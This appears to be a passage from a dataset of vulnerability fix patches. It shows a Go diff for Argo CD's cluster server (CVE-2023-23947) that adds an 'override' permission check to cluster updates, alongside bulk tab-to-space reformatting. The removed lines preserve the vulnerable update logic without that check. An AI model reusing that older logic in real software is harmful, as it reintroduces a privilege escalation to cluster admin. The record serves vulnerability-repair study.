range PermissionMap {\n-\t\tif Can(p, v) {\n-\t\t\tnames = append(names, k[0])\n-\t\t}\n-\t}\n-\tsort.Strings(names)\n-\treturn names\n+        names := make([]string, 0, len(PermissionMap))\n+        for v, k := range PermissionMap {\n+                if Can(p, v) {\n+                        names = append(names, k[0])\n+                }\n+        }\n+        sort.Strings(names)\n+        return names\n }\n \n // Permission is a granular permission. It is an integer instead of a uint\n@@ -117,60 +117,60 @@ type Permission int64\n \n // String implements stringer.\n func (p Permission) String() string {\n-\tif v, ok := PermissionMap[p]; ok {\n-\t\treturn v[0]\n-\t}\n-\treturn fmt.Sprintf(\"Permission(%d)\", int64(p))\n+        if v, ok := PermissionMap[p]; ok {\n+                return v[0]\n+        }\n+        return fmt.Sprintf(\"Permission(%d)\", int64(p))\n }\n \n // Value returns the permissions value as an integer for sql drivers.\n func (p Permission) Value() (driver.Value, error) {\n-\treturn int64(p), nil\n+        return int64(p), nil\n }\n \n // Description returns the description.\n func (p Permission) Description() (string, error) {\n-\tif v, ok := PermissionMap[p]; ok {\n-\t\treturn v[1], nil\n-\t}\n-\treturn \"\", fmt.Errorf(\"missing description for %s\", p)\n+        if v, ok := PermissionMap[p]; ok {\n+                return v[1], nil\n+        }\n+        return \"\", fmt.Errorf(\"missing description for %s\", p)\n }\n \n // Implied returns the additional implied permissions, if any.\n func (p Permission) Implied() []Permission {\n-\treturn requiredPermission[p]\n+        return requiredPermission[p]\n }\n \n const (\n-\t_ Permission = 1 << iota\n+        _ Permission = 1 << iota\n \n-\t// Audit\n-\tAuditRead\n+        // Audit\n+        AuditRead\n \n-\t// API keys\n-\tAPIKeyRead\n-\tAPIKeyWrite\n+        // API keys\n+        APIKeyRead\n+        APIKeyWrite\n \n-\t// Codes\n-\tCodeIssue\n-\tCodeBulkIssue\n-\tCodeRead\n-\tCodeExpire\n+        // Codes\n+        CodeIssue\n+        CodeBulkIssue\n+        CodeRead\n+        CodeExpire\n \n-\t// Realm settings\n-\tSettingsRead\n-\tSettingsWrite\n+        // Realm settings\n+        SettingsRead\n+        SettingsWrite\n \n-\t// Realm statistics\n-\tStatsRead\n+        // Realm statistics\n+        StatsRead\n \n-\t// Mobile apps\n-\tMobileAppRead\n-\tMobileAppWrite\n+        // Mobile apps\n+        MobileAppRead\n+        MobileAppWrite\n \n-\t// Users\n-\tUserRead\n-\tUserWrite\n+        // Users\n+        UserRead\n+        UserWrite\n )\n \n // --\n@@ -179,32 +179,32 @@ const (\n // --\n \n var (\n-\t// requiredPermissions is not exported since maps cannot be constant.\n-\trequiredPermission = map[Permission][]Permission{\n-\t\tAPIKeyWrite:    {APIKeyRead},\n-\t\tCodeBulkIssue:  {CodeIssue},\n-\t\tSettingsWrite:  {SettingsRead},\n-\t\tMobileAppWrite: {MobileAppRead},\n-\t\tUserWrite:      {UserRead},\n-\t}\n-\n-\t// This is the inverse of the above map, set by the init() func.\n-\t// Done in code to ensure it always stays in sync with requiredPermission.\n-\timpliedBy = make(map[Permission][]Permission)\n+        // requiredPermissions is not exported since maps cannot be constant.\n+        requiredPermission = map[Permission][]Permission{\n+                APIKeyWrite:    {APIKeyRead},\n+                CodeBulkIssue:  {CodeIssue},\n+                SettingsWrite:  {SettingsRead},\n+                MobileAppWrite: {MobileAppRead},\n+                UserWrite:      {UserRead},\n+        }\n+\n+        // This is the inverse of the above map, set by the init() func.\n+        // Done in code to ensure it always stays in sync with requiredPermission.\n+        impliedBy = make(map[Permission][]Permission)\n )\n \n // Note: there are multiple init functions in this file. They are organized to be\n // near the thing they are initializing.\n // Yes, go allows multiple init functions in the same module.\n func init() {\n-\tfor has, needs := range requiredPermission {\n-\t\tfor _, perm := range needs {\n-\t\t\tif _, ok := impliedBy[perm]; !ok {\n-\t\t\t\timpliedBy[perm] = make([]Permission, 0, 1)\n-\t\t\t}\n-\t\t\timpliedBy[perm] = append(impliedBy[perm], has)\n-\t\t}\n-\t}\n+        for has, needs := range requiredPermission {\n+                for _, perm := range needs {\n+                        if _, ok := impliedBy[perm]; !ok {\n+                                impliedBy[perm] = make([]Permission, 0, 1)\n+                        }\n+                        impliedBy[perm] = append(impliedBy[perm], has)\n+                }\n+        }\n }\n \n // --\n@@ -212,15 +212,15 @@ func init() {\n // --\n \n const (\n-\t// LegacyRealmUser is a quick reference to the old \"user\" permissions.\n-\tLegacyRealmUser Permission = CodeIssue | CodeBulkIssue | CodeRead | CodeExpire\n-\n-\t// LegacyRealmAdmin is a quick reference to the old \"realm admin\" permissions.\n-\tLegacyRealmAdmin Permission = AuditRead |\n-\t\tAPIKeyRead | APIKeyWrite |\n-\t\tCodeIssue | CodeBulkIssue | CodeRead | CodeExpire |\n-\t\tSettingsRead | SettingsWrite |\n-\t\tStatsRead |\n-\t\tMobileAppRead | MobileAppWrite |\n-\t\tUserRead | UserWrite\n+        // LegacyRealmUser is a quick reference to the old \"user\" permissions.\n+        LegacyRealmUser Permission = CodeIssue | CodeBulkIssue | CodeRead | CodeExpire\n+\n+        // LegacyRealmAdmin is a quick reference to the old \"realm admin\" permissions.\n+        LegacyRealmAdmin Permission = AuditRead |\n+                APIKeyRead | APIKeyWrite |\n+                CodeIssue | CodeBulkIssue | CodeRead | CodeExpire |\n+                SettingsRead | SettingsWrite |\n+                StatsRead |\n+                MobileAppRead | MobileAppWrite |\n+                UserRead | UserWrite\n )\n"}
{"cve":"CVE-2023-23947:0708", "fix_patch": "diff --git a/server/cluster/cluster.go b/server/cluster/cluster.go\nindex 2225a5d6f..f079ddf50 100644\n--- a/server/cluster/cluster.go\n+++ b/server/cluster/cluster.go\n@@ -1,417 +1,427 @@\n package cluster\n \n import (\n-\t\"net/url\"\n-\t\"time\"\n-\n-\t\"context\"\n-\n-\t\"github.com/argoproj/gitops-engine/pkg/utils/kube\"\n-\tlog \"github.com/sirupsen/logrus\"\n-\t\"google.golang.org/grpc/codes\"\n-\t\"google.golang.org/grpc/status\"\n-\tv1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n-\t\"k8s.io/apimachinery/pkg/util/sets\"\n-\t\"k8s.io/client-go/kubernetes\"\n-\n-\t\"github.com/argoproj/argo-cd/v2/pkg/apiclient/cluster\"\n-\tappv1 \"github.com/argoproj/argo-cd/v2/pkg/apis/application/v1alpha1\"\n-\tservercache \"github.com/argoproj/argo-cd/v2/server/cache\"\n-\t\"github.com/argoproj/argo-cd/v2/server/rbacpolicy\"\n-\t\"github.com/argoproj/argo-cd/v2/util/argo\"\n-\t\"github.com/argoproj/argo-cd/v2/util/clusterauth\"\n-\t\"github.com/argoproj/argo-cd/v2/util/db\"\n-\t\"github.com/argoproj/argo-cd/v2/util/rbac\"\n+        \"net/url\"\n+        \"time\"\n+\n+        \"context\"\n+\n+        \"github.com/argoproj/gitops-engine/pkg/utils/kube\"\n+        log \"github.com/sirupsen/logrus\"\n+        \"google.golang.org/grpc/codes\"\n+        \"google.golang.org/grpc/status\"\n+        v1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n+        \"k8s.io/apimachinery/pkg/util/sets\"\n+        \"k8s.io/client-go/kubernetes\"\n+\n+        \"github.com/argoproj/argo-cd/v2/pkg/apiclient/cluster\"\n+        appv1 \"github.com/argoproj/argo-cd/v2/pkg/apis/application/v1alpha1\"\n+        servercache \"github.com/argoproj/argo-cd/v2/server/cache\"\n+        \"github.com/argoproj/argo-cd/v2/server/rbacpolicy\"\n+        \"github.com/argoproj/argo-cd/v2/util/argo\"\n+        \"github.com/argoproj/argo-cd/v2/util/clusterauth\"\n+        \"github.com/argoproj/argo-cd/v2/util/db\"\n+        \"github.com/argoproj/argo-cd/v2/util/rbac\"\n )\n \n // Server provides a Cluster service\n type Server struct {\n-\tdb      db.ArgoDB\n-\tenf     *rbac.Enforcer\n-\tcache   *servercache.Cache\n-\tkubectl kube.Kubectl\n+        db      db.ArgoDB\n+        enf     *rbac.Enforcer\n+        cache   *servercache.Cache\n+        kubectl kube.Kubectl\n }\n \n // NewServer returns a new instance of the Cluster service\n func NewServer(db db.ArgoDB, enf *rbac.Enforcer, cache *servercache.Cache, kubectl kube.Kubectl) *Server {\n-\treturn &Server{\n-\t\tdb:      db,\n-\t\tenf:     enf,\n-\t\tcache:   cache,\n-\t\tkubectl: kubectl,\n-\t}\n+        return &Server{\n+                db:      db,\n+                enf:     enf,\n+                cache:   cache,\n+                kubectl: kubectl,\n+        }\n }\n \n func createRBACObject(project string, server string) string {\n-\tif project != \"\" {\n-\t\treturn project + \"/\" + server\n-\t}\n-\treturn server\n+        if project != \"\" {\n+                return project + \"/\" + server\n+        }\n+        return server\n }\n \n // List returns list of clusters\n func (s *Server) List(ctx context.Context, q *cluster.ClusterQuery) (*appv1.ClusterList, error) {\n-\tclusterList, err := s.db.ListClusters(ctx)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\titems := make([]appv1.Cluster, 0)\n-\tfor _, clust := range clusterList.Items {\n-\t\tif s.enf.Enforce(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionGet, createRBACObject(clust.Project, clust.Server)) {\n-\t\t\titems = append(items, clust)\n-\t\t}\n-\t}\n-\terr = kube.RunAllAsync(len(items), func(i int) error {\n-\t\titems[i] = *s.toAPIResponse(&items[i])\n-\t\treturn nil\n-\t})\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tclusterList.Items = items\n-\treturn clusterList, nil\n+        clusterList, err := s.db.ListClusters(ctx)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        items := make([]appv1.Cluster, 0)\n+        for _, clust := range clusterList.Items {\n+                if s.enf.Enforce(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionGet, createRBACObject(clust.Project, clust.Server)) {\n+                        items = append(items, clust)\n+                }\n+        }\n+        err = kube.RunAllAsync(len(items), func(i int) error {\n+                items[i] = *s.toAPIResponse(&items[i])\n+                return nil\n+        })\n+        if err != nil {\n+                return nil, err\n+        }\n+        clusterList.Items = items\n+        return clusterList, nil\n }\n \n // Create creates a cluster\n func (s *Server) Create(ctx context.Context, q *cluster.ClusterCreateRequest) (*appv1.Cluster, error) {\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionCreate, createRBACObject(q.Cluster.Project, q.Cluster.Server)); err != nil {\n-\t\treturn nil, err\n-\t}\n-\tc := q.Cluster\n-\tserverVersion, err := s.kubectl.GetServerVersion(c.RESTConfig())\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tclust, err := s.db.CreateCluster(ctx, c)\n-\tif err != nil {\n-\t\tif status.Convert(err).Code() == codes.AlreadyExists {\n-\t\t\t// act idempotent if existing spec matches new spec\n-\t\t\texisting, getErr := s.db.GetCluster(ctx, c.Server)\n-\t\t\tif getErr != nil {\n-\t\t\t\treturn nil, status.Errorf(codes.Internal, \"unable to check existing cluster details: %v\", getErr)\n-\t\t\t}\n-\n-\t\t\tif existing.Equals(c) {\n-\t\t\t\tclust = existing\n-\t\t\t} else if q.Upsert {\n-\t\t\t\treturn s.Update(ctx, &cluster.ClusterUpdateRequest{Cluster: c})\n-\t\t\t} else {\n-\t\t\t\treturn nil, status.Errorf(codes.InvalidArgument, argo.GenerateSpecIsDifferentErrorMessage(\"cluster\", existing, c))\n-\t\t\t}\n-\t\t} else {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\terr = s.cache.SetClusterInfo(c.Server, &appv1.ClusterInfo{\n-\t\tServerVersion: serverVersion,\n-\t\tConnectionState: appv1.ConnectionState{\n-\t\t\tStatus:     appv1.ConnectionStatusSuccessful,\n-\t\t\tModifiedAt: &v1.Time{Time: time.Now()},\n-\t\t},\n-\t})\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn s.toAPIResponse(clust), err\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionCreate, createRBACObject(q.Cluster.Project, q.Cluster.Server)); err != nil {\n+                return nil, err\n+        }\n+        c := q.Cluster\n+        serverVersion, err := s.kubectl.GetServerVersion(c.RESTConfig())\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        clust, err := s.db.CreateCluster(ctx, c)\n+        if err != nil {\n+                if status.Convert(err).Code() == codes.AlreadyExists {\n+                        // act idempotent if existing spec matches new spec\n+                        existing, getErr := s.db.GetCluster(ctx, c.Server)\n+                        if getErr != nil {\n+                                return nil, status.Errorf(codes.Internal, \"unable to check existing cluster details: %v\", getErr)\n+                        }\n+\n+                        if existing.Equals(c) {\n+                                clust = existing\n+                        } else if q.Upsert {\n+                                return s.Update(ctx, &cluster.ClusterUpdateRequest{Cluster: c})\n+                        } else {\n+                                return nil, status.Errorf(codes.InvalidArgument, argo.GenerateSpecIsDifferentErrorMessage(\"cluster\", existing, c))\n+                        }\n+                } else {\n+                        return nil, err\n+                }\n+        }\n+\n+        err = s.cache.SetClusterInfo(c.Server, &appv1.ClusterInfo{\n+                ServerVersion: serverVersion,\n+                ConnectionState: appv1.ConnectionState{\n+                        Status:     appv1.ConnectionStatusSuccessful,\n+                        ModifiedAt: &v1.Time{Time: time.Now()},\n+                },\n+        })\n+        if err != nil {\n+                return nil, err\n+        }\n+        return s.toAPIResponse(clust), err\n }\n \n // Get returns a cluster from a query\n func (s *Server) Get(ctx context.Context, q *cluster.ClusterQuery) (*appv1.Cluster, error) {\n-\tc, err := s.getClusterWith403IfNotExist(ctx, q)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n+        c, err := s.getClusterWith403IfNotExist(ctx, q)\n+        if err != nil {\n+                return nil, err\n+        }\n \n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionGet, createRBACObject(c.Project, q.Server)); err != nil {\n-\t\treturn nil, err\n-\t}\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionGet, createRBACObject(c.Project, q.Server)); err != nil {\n+                return nil, err\n+        }\n \n-\treturn s.toAPIResponse(c), nil\n+        return s.toAPIResponse(c), nil\n }\n \n func (s *Server) getClusterWith403IfNotExist(ctx context.Context, q *cluster.ClusterQuery) (*appv1.Cluster, error) {\n-\trepo, err := s.getCluster(ctx, q)\n-\tif err != nil || repo == nil {\n-\t\treturn nil, status.Error(codes.PermissionDenied, \"permission denied\")\n-\t}\n-\treturn repo, nil\n+        repo, err := s.getCluster(ctx, q)\n+        if err != nil || repo == nil {\n+                return nil, status.Error(codes.PermissionDenied, \"permission denied\")\n+        }\n+        return repo, nil\n }\n \n func (s *Server) getCluster(ctx context.Context, q *cluster.ClusterQuery) (*appv1.Cluster, error) {\n-\tif q.Id != nil {\n-\t\tq.Server = \"\"\n-\t\tq.Name = \"\"\n-\t\tif q.Id.Type == \"name\" {\n-\t\t\tq.Name = q.Id.Value\n-\t\t} else if q.Id.Type == \"name_escaped\" {\n-\t\t\tnameUnescaped, err := url.QueryUnescape(q.Id.Value)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, err\n-\t\t\t}\n-\t\t\tq.Name = nameUnescaped\n-\t\t} else {\n-\t\t\tq.Server = q.Id.Value\n-\t\t}\n-\t}\n-\n-\tif q.Server != \"\" {\n-\t\tc, err := s.db.GetCluster(ctx, q.Server)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\treturn c, nil\n-\t}\n-\n-\t//we only get the name when we specify Name in ApplicationDestination and next\n-\t//we want to find the server in order to populate ApplicationDestination.Server\n-\tif q.Name != \"\" {\n-\t\tclusterList, err := s.db.ListClusters(ctx)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tfor _, c := range clusterList.Items {\n-\t\t\tif c.Name == q.Name {\n-\t\t\t\treturn &c, nil\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\treturn nil, nil\n+        if q.Id != nil {\n+                q.Server = \"\"\n+                q.Name = \"\"\n+                if q.Id.Type == \"name\" {\n+                        q.Name = q.Id.Value\n+                } else if q.Id.Type == \"name_escaped\" {\n+                        nameUnescaped, err := url.QueryUnescape(q.Id.Value)\n+                        if err != nil {\n+                                return nil, err\n+                        }\n+                        q.Name = nameUnescaped\n+                } else {\n+                        q.Server = q.Id.Value\n+                }\n+        }\n+\n+        if q.Server != \"\" {\n+                c, err := s.db.GetCluster(ctx, q.Server)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                return c, nil\n+        }\n+\n+        //we only get the name when we specify Name in ApplicationDestination and next\n+        //we want to find the server in order to populate ApplicationDestination.Server\n+        if q.Name != \"\" {\n+                clusterList, err := s.db.ListClusters(ctx)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                for _, c := range clusterList.Items {\n+                        if c.Name == q.Name {\n+                                return &c, nil\n+                        }\n+                }\n+        }\n+\n+        return nil, nil\n }\n \n var clusterFieldsByPath = map[string]func(updated *appv1.Cluster, existing *appv1.Cluster){\n-\t\"name\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n-\t\tupdated.Name = existing.Name\n-\t},\n-\t\"namespaces\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n-\t\tupdated.Namespaces = existing.Namespaces\n-\t},\n-\t\"config\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n-\t\tupdated.Config = existing.Config\n-\t},\n-\t\"shard\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n-\t\tupdated.Shard = existing.Shard\n-\t},\n-\t\"clusterResources\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n-\t\tupdated.ClusterResources = existing.ClusterResources\n-\t},\n-\t\"labels\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n-\t\tupdated.Labels = existing.Labels\n-\t},\n-\t\"annotations\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n-\t\tupdated.Annotations = existing.Annotations\n-\t},\n-\t\"project\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n-\t\tupdated.Project = existing.Project\n-\t},\n+        \"name\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n+                updated.Name = existing.Name\n+        },\n+        \"namespaces\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n+                updated.Namespaces = existing.Namespaces\n+        },\n+        \"config\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n+                updated.Config = existing.Config\n+        },\n+        \"shard\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n+                updated.Shard = existing.Shard\n+        },\n+        \"clusterResources\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n+                updated.ClusterResources = existing.ClusterResources\n+        },\n+        \"labels\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n+                updated.Labels = existing.Labels\n+        },\n+        \"annotations\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n+                updated.Annotations = existing.Annotations\n+        },\n+        \"project\": func(updated *appv1.Cluster, existing *appv1.Cluster) {\n+                updated.Project = existing.Project\n+        },\n }\n \n // Update updates a cluster\n func (s *Server) Update(ctx context.Context, q *cluster.ClusterUpdateRequest) (*appv1.Cluster, error) {\n-\tc, err := s.getClusterWith403IfNotExist(ctx, &cluster.ClusterQuery{\n-\t\tServer: q.Cluster.Server,\n-\t\tName:   q.Cluster.Name,\n-\t\tId:     q.Id,\n-\t})\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\t// verify that user can do update inside project where cluster is located\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(c.Project, q.Cluster.Server)); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif len(q.UpdatedFields) == 0 || sets.NewString(q.UpdatedFields...).Has(\"project\") {\n-\t\t// verify that user can do update inside project where cluster will be located\n-\t\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(q.Cluster.Project, q.Cluster.Server)); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\tif len(q.UpdatedFields) != 0 {\n-\t\tfor _, path := range q.UpdatedFields {\n-\t\t\tif updater, ok := clusterFieldsByPath[path]; ok {\n-\t\t\t\tupdater(c, q.Cluster)\n-\t\t\t}\n-\t\t}\n-\t\tq.Cluster = c\n-\t}\n-\n-\t// Test the token we just created before persisting it\n-\tserverVersion, err := s.kubectl.GetServerVersion(q.Cluster.RESTConfig())\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tclust, err := s.db.UpdateCluster(ctx, q.Cluster)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\terr = s.cache.SetClusterInfo(clust.Server, &appv1.ClusterInfo{\n-\t\tServerVersion: serverVersion,\n-\t\tConnectionState: appv1.ConnectionState{\n-\t\t\tStatus:     appv1.ConnectionStatusSuccessful,\n-\t\t\tModifiedAt: &v1.Time{Time: time.Now()},\n-\t\t},\n-\t})\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn s.toAPIResponse(clust), nil\n+        c, err := s.getClusterWith403IfNotExist(ctx, &cluster.ClusterQuery{\n+                Server: q.Cluster.Server,\n+                Name:   q.Cluster.Name,\n+                Id:     q.Id,\n+        })\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        // verify that user can do update inside project where cluster is located\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(c.Project, q.Cluster.Server)); err != nil {\n+                return nil, err\n+        }\n+\n+        if len(q.UpdatedFields) == 0 || sets.NewString(q.UpdatedFields...).Has(\"project\") {\n+                // verify that user can do update inside project where cluster will be located\n+                if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(q.Cluster.Project, q.Cluster.Server)); err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        // To prevent privilege escalation, users are required to have the `override` action granted for the cluster resource.\n+        // This is because updating certain fields (like `config`) can be used to gain admin access to the cluster.\n+        // We whitelist certain fields that are safe to update with just the `update` action.\n+        allowedUpdates := sets.NewString(\"name\", \"namespaces\", \"clusterResourceWhitelist\", \"clusterResourceBlacklist\")\n+        if (len(q.UpdatedFields) == 0 && q.Cluster != nil) || (len(q.UpdatedFields) > 0 && !allowedUpdates.HasAll(q.UpdatedFields...)) {\n+                if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionOverride, createRBACObject(c.Project, q.Cluster.Server)); err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        if len(q.UpdatedFields) != 0 {\n+                for _, path := range q.UpdatedFields {\n+                        if updater, ok := clusterFieldsByPath[path]; ok {\n+                                updater(c, q.Cluster)\n+                        }\n+                }\n+                q.Cluster = c\n+        }\n+\n+        // Test the token we just created before persisting it\n+        serverVersion, err := s.kubectl.GetServerVersion(q.Cluster.RESTConfig())\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        clust, err := s.db.UpdateCluster(ctx, q.Cluster)\n+        if err != nil {\n+                return nil, err\n+        }\n+        err = s.cache.SetClusterInfo(clust.Server, &appv1.ClusterInfo{\n+                ServerVersion: serverVersion,\n+                ConnectionState: appv1.ConnectionState{\n+                        Status:     appv1.ConnectionStatusSuccessful,\n+                        ModifiedAt: &v1.Time{Time: time.Now()},\n+                },\n+        })\n+        if err != nil {\n+                return nil, err\n+        }\n+        return s.toAPIResponse(clust), nil\n }\n \n // Delete deletes a cluster by server/name\n func (s *Server) Delete(ctx context.Context, q *cluster.ClusterQuery) (*cluster.ClusterResponse, error) {\n-\tc, err := s.getClusterWith403IfNotExist(ctx, q)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif q.Name != \"\" {\n-\t\tservers, err := s.db.GetClusterServersByName(ctx, q.Name)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tfor _, server := range servers {\n-\t\t\tif err := enforceAndDelete(s, ctx, server, c.Project); err != nil {\n-\t\t\t\treturn nil, err\n-\t\t\t}\n-\t\t}\n-\t} else {\n-\t\tif err := enforceAndDelete(s, ctx, q.Server, c.Project); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\treturn &cluster.ClusterResponse{}, nil\n+        c, err := s.getClusterWith403IfNotExist(ctx, q)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        if q.Name != \"\" {\n+                servers, err := s.db.GetClusterServersByName(ctx, q.Name)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                for _, server := range servers {\n+                        if err := enforceAndDelete(s, ctx, server, c.Project); err != nil {\n+                                return nil, err\n+                        }\n+                }\n+        } else {\n+                if err := enforceAndDelete(s, ctx, q.Server, c.Project); err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        return &cluster.ClusterResponse{}, nil\n }\n \n func enforceAndDelete(s *Server, ctx context.Context, server, project string) error {\n-\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionDelete, createRBACObject(project, server)); err != nil {\n-\t\treturn err\n-\t}\n-\tif err := s.db.DeleteCluster(ctx, server); err != nil {\n-\t\treturn err\n-\t}\n-\treturn nil\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionDelete, createRBACObject(project, server)); err != nil {\n+                return err\n+        }\n+        if err := s.db.DeleteCluster(ctx, server); err != nil {\n+                return err\n+        }\n+        return nil\n }\n \n // RotateAuth rotates the bearer token used for a cluster\n func (s *Server) RotateAuth(ctx context.Context, q *cluster.ClusterQuery) (*cluster.ClusterResponse, error) {\n-\tclust, err := s.getClusterWith403IfNotExist(ctx, q)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tvar servers []string\n-\tif q.Name != \"\" {\n-\t\tservers, err = s.db.GetClusterServersByName(ctx, q.Name)\n-\t\tif err != nil {\n-\t\t\treturn nil, status.Errorf(codes.NotFound, \"failed to get cluster servers by name: %v\", err)\n-\t\t}\n-\t\tfor _, server := range servers {\n-\t\t\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(clust.Project, server)); err != nil {\n-\t\t\t\treturn nil, status.Errorf(codes.PermissionDenied, \"encountered permissions issue while processing request: %v\", err)\n-\t\t\t}\n-\t\t}\n-\t} else {\n-\t\tif err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(clust.Project, q.Server)); err != nil {\n-\t\t\treturn nil, status.Errorf(codes.PermissionDenied, \"encountered permissions issue while processing request: %v\", err)\n-\t\t}\n-\t\tservers = append(servers, q.Server)\n-\t}\n-\n-\tfor _, server := range servers {\n-\t\tlogCtx := log.WithField(\"cluster\", server)\n-\t\tlogCtx.Info(\"Rotating auth\")\n-\t\trestCfg := clust.RESTConfig()\n-\t\tif restCfg.BearerToken == \"\" {\n-\t\t\treturn nil, status.Errorf(codes.InvalidArgument, \"Cluster '%s' does not use bearer token authentication\", server)\n-\t\t}\n-\n-\t\tclaims, err := clusterauth.ParseServiceAccountToken(restCfg.BearerToken)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tkubeclientset, err := kubernetes.NewForConfig(restCfg)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tnewSecret, err := clusterauth.GenerateNewClusterManagerSecret(kubeclientset, claims)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\t// we are using token auth, make sure we don't store client-cert information\n-\t\tclust.Config.KeyData = nil\n-\t\tclust.Config.CertData = nil\n-\t\tclust.Config.BearerToken = string(newSecret.Data[\"token\"])\n-\n-\t\t// Test the token we just created before persisting it\n-\t\tserverVersion, err := s.kubectl.GetServerVersion(clust.RESTConfig())\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\t_, err = s.db.UpdateCluster(ctx, clust)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\terr = s.cache.SetClusterInfo(clust.Server, &appv1.ClusterInfo{\n-\t\t\tServerVersion: serverVersion,\n-\t\t\tConnectionState: appv1.ConnectionState{\n-\t\t\t\tStatus:     appv1.ConnectionStatusSuccessful,\n-\t\t\t\tModifiedAt: &v1.Time{Time: time.Now()},\n-\t\t\t},\n-\t\t})\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\terr = clusterauth.RotateServiceAccountSecrets(kubeclientset, claims, newSecret)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tlogCtx.Infof(\"Rotated auth (old: %s, new: %s)\", claims.SecretName, newSecret.Name)\n-\t}\n-\treturn &cluster.ClusterResponse{}, nil\n+        clust, err := s.getClusterWith403IfNotExist(ctx, q)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        var servers []string\n+        if q.Name != \"\" {\n+                servers, err = s.db.GetClusterServersByName(ctx, q.Name)\n+                if err != nil {\n+                        return nil, status.Errorf(codes.NotFound, \"failed to get cluster servers by name: %v\", err)\n+                }\n+                for _, server := range servers {\n+                        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceClusters, rbacpolicy.ActionUpdate, createRBACObject(clust.Project, server)); err != nil {\n+                                return nil, status.Errorf(codes.PermissionDenied, \"encountered permissions issue while processing request: %v\", err)\n+                        }\n+                }\n+        } else {\n+                